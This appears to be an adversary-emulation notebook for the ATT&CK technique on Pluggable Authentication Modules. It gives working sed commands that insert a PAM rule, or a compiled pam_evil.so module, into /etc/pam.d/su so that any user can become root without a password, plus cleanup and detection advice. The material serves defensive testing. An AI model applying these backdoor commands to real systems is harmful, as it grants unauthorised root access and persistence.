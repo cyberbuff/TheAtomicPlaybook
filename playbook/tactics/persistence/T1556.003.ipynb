{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0e688351",
   "metadata": {},
   "source": "# T1556.003 - Pluggable Authentication Modules\nAdversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)"
  },
  {
   "cell_type": "markdown",
   "id": "24207736",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "d6fe7b7c",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Malicious PAM rule",
    "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo sed -i \"1s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su-l\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "70a37e8f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "36ed101a",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo sed -i \"\\,auth sufficient pam_succeed_if.so uid >= 0,d\" /etc/pam.d/su-l\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b37b8cb9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.003 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3d1586c3",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Malicious PAM rule (freebsd)",
    "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo sed -i \"\" \"8s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba2ff06b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "08ef40f0",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo sed -i \"\" \"/auth sufficient pam_succeed_if.so uid >= 0/d\" /etc/pam.d/su\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96dc4e95",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "532ec55d",
   "metadata": {},
   "source": "### Atomic Test #3 - Malicious PAM module\nCreates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: The PAM development library must be installed to build the PAM module\n\n##### Check Prereq Commands:\n```sh\nif [ -f /usr/include/security/pam_modules.h ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nif [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi\n\n```\n##### Description: The PAM module must exist on disk at specified location (#{path_to_pam_module})\n\n##### Check Prereq Commands:\n```sh\nif [ -f /tmp/pam_evil.so ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nsudo gcc -shared -fPIC -o /tmp/pam_evil.so PathToAtomicsFolder/T1556.003/src/pam_evil.c\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "381c4905",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.003 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a9c3d122",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo sed -i \"1s,^,auth sufficient /tmp/pam_evil.so\\n,g\" /etc/pam.d/su-l\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0ac810fb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.003 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "48429110",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo sed -i \"\\,auth sufficient /tmp/pam_evil.so,d\" /etc/pam.d/su-l\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fd6c2a02",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1556.003 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "39342014",
   "metadata": {},
   "source": "## Detection\nMonitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access)."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}